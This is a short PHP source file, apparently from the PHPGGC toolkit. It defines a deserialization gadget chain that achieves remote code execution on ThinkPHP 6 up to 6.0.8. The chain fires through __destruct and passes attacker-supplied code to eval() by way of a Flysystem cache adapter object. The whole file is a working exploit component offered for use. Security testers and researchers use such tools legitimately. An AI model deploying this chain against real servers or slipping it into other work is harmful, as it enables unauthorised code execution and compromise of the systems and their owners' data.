<?php

namespace GadgetChain\ThinkPHP;

class RCE3 extends \PHPGGC\GadgetChain\RCE\PHPCode
{
    public static $version = '6 <= 6.0.8';
    public static $vector = '__destruct';
    public static $author = 'afkl';
    public static $information = 'Executes through eval() ( eval(\'?>\ <?php $code;\'); )';

    public function generate(array $parameters)
    {
        $code = $parameters['code'];
        return new \League\Flysystem\Cached\Storage\Adapter($code);
    }
}